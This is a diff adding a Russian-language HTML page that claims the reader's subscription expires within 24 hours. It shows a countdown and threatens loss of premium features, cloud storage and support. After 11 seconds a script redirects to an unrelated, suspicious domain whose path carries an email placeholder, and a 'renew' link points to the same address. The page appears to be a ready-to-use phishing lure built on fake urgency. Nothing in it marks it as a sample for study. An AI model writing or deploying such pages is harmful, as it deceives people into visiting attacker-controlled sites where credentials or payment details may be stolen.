@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Подписка истекает</title>
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://echonest-lnq4jvibeflux.thihekou.za.com/!HYCNC2RsG/$3mail@a.b.c0/";
+        }, 11000);
+    </script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #ff6b6b; padding: 50px; }
+        .subscription { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        .countdown { background: #ff6b6b; color: white; padding: 20px; border-radius: 50%; width: 80px; height: 80px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 24px; font-weight: bold; }
+        .urgent { color: #ff6b6b; font-weight: bold; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="subscription">
+        <div class="countdown" id="subCountdown">11</div>
+        <h2 class="urgent">ВАША ПОДПИСКА ИСТЕКАЕТ!</h2>
+        <p>До окончания действия вашей подписки осталось менее 24 часов</p>
+        <p>После истечения срока вы потеряете доступ к:</p>
+        <ul>
+            <li>Премиум функциям</li>
+            <li>Облачному хранилищу</li>
+            <li>Приоритетной поддержке</li>
+        </ul>
+        <p>Перенаправление через: <span id="subTimer">11</span> секунд</p>
+        <p style="text-align: center;"><a href="https://echonest-lnq4jvibeflux.thihekou.za.com/!HYCNC2RsG/$3mail@a.b.c0/">Продлить подписку</a></p>
+    </div>
+    
+    <script>
+        let subTimer = 11;
+        setInterval(function() {
+            subTimer--;
+            document.getElementById('subTimer').textContent = subTimer;
+            document.getElementById('subCountdown').textContent = subTimer;
+        }, 1000);
+    </script>
+</body>
+</html>
